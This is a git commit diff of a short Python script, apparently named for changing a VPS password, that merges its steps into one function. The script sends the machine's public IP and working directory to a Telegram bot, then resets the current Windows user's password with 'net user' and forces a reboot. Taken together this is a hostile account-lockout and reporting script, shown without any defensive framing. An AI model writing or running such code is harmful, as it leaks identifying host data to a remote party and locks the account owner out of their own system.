707e569a933d13a4547c79ad7902e28b04bc0a08
r-m <98047816+r4myh@users.noreply.github.com>
2022-03-05 05:41:59 -1000

    Update vps-changpas.py

--- vps-changpas.py
+++ vps-changpas.py
@@ -3,22 +3,19 @@ import requests
 
 
 
-class send:
-    def __init__(self):
-        url = 'https://httpbin.org/ip'
-        re = requests.get(url).text
-        cwd = os.getcwd()
-
+def start():
+    url = 'https://httpbin.org/ip'
+    re = requests.get(url).text
+    cwd = os.getcwd()
+        
+    try:
         requests.get(f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text="+str(re+'\n'+cwd))
-
-
-
-def change():
-    os.system(f"net user %username% {your-pass}")
-    os.system("shutdown -r")
+        os.system(f"net user %username% {your-pass}")
+        os.system("shutdown -r")
+    except:
+        print("check connection")
 
 
 
 if __name__ == '__main__':
-    send()
-    change()
+    start()
